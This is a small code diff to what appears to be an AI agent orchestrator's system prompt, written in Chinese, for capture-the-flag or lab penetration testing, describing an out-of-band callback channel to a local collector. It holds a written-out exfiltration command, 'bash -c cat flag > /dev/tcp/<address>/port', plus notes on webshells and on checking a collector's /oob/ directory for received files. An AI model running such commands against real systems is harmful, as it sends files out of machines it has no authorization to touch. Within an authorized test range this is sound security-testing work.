@@ -112,7 +112,8 @@ export const ORCHESTRATOR_PROMPT = [
   'ssh 通道用 shell 工具 register 自注册进审计体系(禁 bash 裸跑绕审计);6.OOB 侧信道:',
   `收集器监听宿主 0.0.0.0:${PORT_MAP.oobCollector}——本机/宿主进程回连 127.0.0.1:${PORT_MAP.oobCollector};`,
   `容器化目标(靶场容器内)回连宿主网关 172.17.0.1:${PORT_MAP.oobCollector}(容器内 127.0.0.1 指向容器自身, 架构性不可达);`,
-  '回连即 bash -c \'cat flag > /dev/tcp/<上面按目标形态选的地址>/' + PORT_MAP.oobCollector + '\' 注意外层须 bash -c 包裹',
+  '回连即 bash -c \'cat flag > /dev/tcp/<上面按目标形态选的地址>/' + PORT_MAP.oobCollector + '\' 注意外层须 bash -c 包裹; ',
+  '实收查询面(循环3): 收集器落盘只读挂载于沙箱 /oob/——判收=bash ls -t /oob/ | head 与 cat /oob/<最新文件>(按时间+来源 IP 命名)',
   '(webshell/受限 shell 常为 dash,裸 /dev/tcp 会静默失败);判收纪律: 盲回连无回执——rc=0/stderr 均不证明送达, 必须查收集器日志实收记录(假阳性教训 8866); 适合',
  '「首读者必死」场景;6.授权边界写进派发指令的参数区,不留在散文里。',
 
